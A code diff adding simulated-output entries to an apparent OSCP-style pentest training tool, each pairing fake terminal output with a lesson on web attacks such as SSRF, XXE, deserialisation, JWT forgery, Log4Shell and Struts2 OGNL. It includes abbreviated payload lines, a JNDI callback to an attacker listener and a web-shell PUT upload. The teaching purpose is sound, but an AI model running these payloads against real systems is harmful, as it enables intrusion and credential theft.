@@ -994,5 +994,182 @@
       teach: 'A silver ticket forges a service ticket using one service account\'s hash — scoped to that one service, but it never touches the DC, so it is quiet. Narrower than a golden ticket, and useful when all you have is a single service hash.',
     },
 
+    // ==================== WEB (depth) ====================
+    'svn-exposed': {
+      output: [
+        '$ curl -s http://10.10.10.10/.svn/entries',
+        '10',
+        'dir',
+        'https://svn.corp.local/app',
+        'config.php',
+        'db_connect.php',
+      ].join('\n'),
+      signal: 'db_connect.php',
+      teach: 'An exposed `.svn/` directory leaks the source tree the same way `.git/` does. Reconstruct the files — `db_connect.php` likely holds database credentials. Version-control leftovers are a goldmine; always check for them.',
+    },
+    'ssrf': {
+      output: [
+        '$ curl \'http://10.10.10.10/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\'',
+        's3-readonly-role',
+        '$ curl \'http://10.10.10.10/fetch?url=http://169.254.169.254/.../s3-readonly-role\'',
+        '"AccessKeyId": "AKIA...", "SecretAccessKey": "wJal..."',
+      ].join('\n'),
+      signal: '"AccessKeyId": "AKIA...", "SecretAccessKey": "wJal..."',
+      teach: 'Server-Side Request Forgery makes the server fetch a URL you choose. Pointed at a cloud metadata endpoint (169.254.169.254), it leaks IAM credentials; pointed inside, it reaches services the firewall hides. The server is your proxy into places you cannot reach.',
+    },
+    'xxe': {
+      output: [
+        '$ curl -s -X POST http://10.10.10.10/api -d @payload.xml',
+        '<?xml ... <!ENTITY xxe SYSTEM "file:///etc/passwd">',
+        'root:x:0:0:root:/root:/bin/bash',
+        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
+      ].join('\n'),
+      signal: 'root:x:0:0:root:/root:/bin/bash',
+      teach: 'XML External Entity injection abuses an XML parser that resolves external entities. Declare one pointing at `file:///etc/passwd` and the response echoes the file back. Any endpoint that accepts XML is worth testing for it.',
+    },
+    'deserialization': {
+      output: [
+        '$ ysoserial CommonsCollections5 \'...\' | base64',
+        '$ # listener receives the callback:',
+        'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10]',
+        'uid=0(root) gid=0(root)',
+      ].join('\n'),
+      signal: 'uid=0(root) gid=0(root)',
+      teach: 'When an app deserialises attacker-controlled data, a crafted object (ysoserial builds them) runs code as it is rebuilt. The callback as root is code execution. Look for serialised blobs in cookies, parameters, and APIs.',
+    },
+    'jwt-attacks': {
+      output: [
+        '$ echo $TOKEN | cut -d. -f2 | base64 -d',
+        '{"user":"guest","role":"user","alg":"HS256"}',
+        '$ # re-sign with alg:none or a cracked secret',
+        '{"user":"admin","role":"admin"}',
+      ].join('\n'),
+      signal: '{"user":"admin","role":"admin"}',
+      teach: 'A JSON Web Token is only as safe as its signature. If the server accepts `alg:none`, or the HMAC secret is weak enough to crack, you forge a token that says `admin`. Always decode the token first — the claims tell you what to tamper with.',
+    },
+    'nosql-injection': {
+      output: [
+        '$ curl -s -X POST http://10.10.10.10/login -d \'user[$ne]=x&pass[$ne]=x\'',
+        'HTTP/1.1 302 Found',
+        'Location: /dashboard',
+        'Set-Cookie: session=loggedin-as-admin',
+      ].join('\n'),
+      signal: 'Set-Cookie: session=loggedin-as-admin',
+      teach: 'NoSQL backends like MongoDB take query operators as input. `{"$ne":"x"}` means "not equal to x" — always true — so the login matches the first user and you are in without a password. Test JSON and array params against NoSQL apps.',
+    },
+    'jenkins-access': {
+      output: [
+        '$ curl -s http://10.10.10.10:8080/script',
+        '# Groovy console reachable (authenticated or anonymous)',
+        'println "whoami".execute().text',
+        'nt authority\\system',
+      ].join('\n'),
+      signal: 'nt authority\\system',
+      teach: 'Jenkins\' Script Console runs arbitrary Groovy as the Jenkins service — often SYSTEM or a build account. If `/script` is reachable, it is remote code execution by design. CI servers are high-value: they hold credentials and run as privileged accounts.',
+    },
+    'verb-tampering': {
+      output: [
+        '$ curl -s -X OPTIONS -i http://10.10.10.10/admin/',
+        'HTTP/1.1 200 OK',
+        'Allow: GET, POST, PUT',
+        '$ curl -s -X PUT http://10.10.10.10/admin/shell.jsp --data-binary @shell.jsp',
+        'HTTP/1.1 201 Created',
+      ].join('\n'),
+      signal: 'HTTP/1.1 201 Created',
+      teach: 'Access controls often guard GET/POST but forget other verbs. If PUT is allowed, you can upload a web shell directly — "201 Created" means it landed. Enumerate the allowed methods before assuming a path is locked down.',
+    },
+    'xss-basics': {
+      output: [
+        '$ curl -s \'http://10.10.10.10/search.php?q=<b>xssprobe123</b>\'',
+        '<p>No results for <b>xssprobe123</b></p>',
+      ].join('\n'),
+      signal: '<p>No results for <b>xssprobe123</b></p>',
+      teach: 'Your `<b>` tag came back rendered, not escaped — the page reflects input into HTML unsanitised. That is reflected XSS: it runs in a victim\'s browser, useful for stealing sessions. On OSCP it matters most where it can reach an admin.',
+    },
+    'check-log4shell': {
+      output: [
+        '$ curl http://10.10.10.10/ -H \'User-Agent: ${jndi:ldap://10.10.14.5/x}\'',
+        '# listener on 10.10.14.5:389 receives:',
+        'LDAP query from 10.10.10.10 for /x',
+      ].join('\n'),
+      signal: 'LDAP query from 10.10.10.10 for /x',
+      teach: 'Log4Shell (CVE-2021-44228) triggers when a vulnerable Log4j logs your `${jndi:ldap://...}` string and dutifully connects out to it. The inbound LDAP hit on your listener confirms the callback — the first step before staging a full exploit.',
+    },
+    'check-struts2': {
+      output: [
+        '$ curl -s \'http://10.10.10.10/\' -H "Content-Type: %{(#cmd=\'id\')...}"',
+        'uid=0(root) gid=0(root) groups=0(root)',
+      ].join('\n'),
+      signal: 'uid=0(root) gid=0(root) groups=0(root)',
+      teach: 'Apache Struts2 OGNL injection (e.g. CVE-2017-5638) evaluates attacker expressions in a header and runs commands — here as root. A dated Struts app is often a one-request shell; fingerprint the framework version first.',
+    },
+
+    // ==================== SERVICE & WEB CHECKS (depth) ====================
+    'check-cors': {
+      output: [
+        '$ curl -sI -H "Origin: https://evil.example" http://10.10.10.10/api/me',
+        'Access-Control-Allow-Origin: https://evil.example',
+        'Access-Control-Allow-Credentials: true',
+      ].join('\n'),
+      signal: 'Access-Control-Allow-Origin: https://evil.example',
+      teach: 'The server reflected your arbitrary Origin AND allows credentials — a CORS misconfiguration. A malicious page could read a logged-in victim\'s API responses, including their data and tokens. Reflected Origin + credentials:true is the dangerous combination.',
+    },
+    'check-http-redirect': {
+      output: [
+        '$ curl -sI http://10.10.10.10/',
+        'HTTP/1.1 301 Moved Permanently',
+        'Location: https://dev-internal.corp.local/',
+      ].join('\n'),
+      signal: 'Location: https://dev-internal.corp.local/',
+      teach: 'A redirect can leak an internal hostname in its Location header — `dev-internal.corp.local` is a name you had no other way to learn. Add it to /etc/hosts and your target list; the redirect just widened the attack surface.',
+    },
+    'check-subdomain-takeover': {
+      output: [
+        '$ dig +noall +answer CNAME shop.corp.local',
+        'shop.corp.local.  300  IN  CNAME  corp-shop.herokuapp.com.',
+        '$ curl -s https://shop.corp.local/',
+        'No such app — there is no app configured at that hostname',
+      ].join('\n'),
+      signal: 'No such app — there is no app configured at that hostname',
+      teach: 'A CNAME pointing at a cloud service that is no longer claimed is a subdomain takeover: register the dangling target yourself and you control content on the victim\'s trusted subdomain. The "no such app" page is the tell.',
+    },
+    'check-dns-email': {
+      output: [
+        '$ dig +short TXT corp.local',
+        '"v=spf1 include:_spf.google.com ~all"',
+        '$ dig +short TXT _dmarc.corp.local',
+        '"v=DMARC1; p=none"',
+      ].join('\n'),
+      signal: '"v=DMARC1; p=none"',
+      teach: 'Email records tell you whether a domain can be spoofed. A soft SPF (`~all`) plus DMARC `p=none` means forged mail from this domain is unlikely to be rejected — a phishing lead in a real engagement, a reporting finding on the exam.',
+    },
+    'check-web-components': {
+      output: [
+        '$ curl -sI http://10.10.10.10/',
+        'Server: Apache/2.4.49 (Unix)',
+        'X-Powered-By: PHP/7.2.24',
+        'Set-Cookie: PHPSESSID=...; path=/',
+      ].join('\n'),
+      signal: 'Server: Apache/2.4.49 (Unix)',
+      teach: 'Response headers hand you the stack for free: web server, language, framework, sometimes exact versions. `Apache 2.4.49` and `PHP 7.2.24` are both searchable for known CVEs. Read the headers before you do anything clever.',
+    },
+    'check-cms-version': {
+      output: [
+        '$ curl -s http://10.10.10.10/CHANGELOG.txt | head -2',
+        'Drupal 7.57, 2018-02-21',
+        '$ # 7.57 predates Drupalgeddon2 (CVE-2018-7600)',
+      ].join('\n'),
+      signal: 'Drupal 7.57, 2018-02-21',
+      teach: 'CMSes leak their version in changelogs, readme files, and meta tags. A pinned version like Drupal 7.57 maps straight to known exploits (here Drupalgeddon2). Identify the CMS and its exact build, then look up what it is vulnerable to.',
+    },
+    'check-web-body': {
+      output: [
+        '$ curl -s http://10.10.10.10/ | grep -iE "comment|TODO|password"',
+        '<!-- TODO: remove test login test/test before go-live -->',
+      ].join('\n'),
+      signal: '<!-- TODO: remove test login test/test before go-live -->',
+      teach: 'View the source. Developers leave credentials, debug endpoints, and TODOs in HTML comments and JavaScript all the time. A `test/test` login left in a comment is a free set of working credentials — read the page humans never read.',
+    },
+
   };
 })(typeof globalThis !== 'undefined' ? globalThis : this);
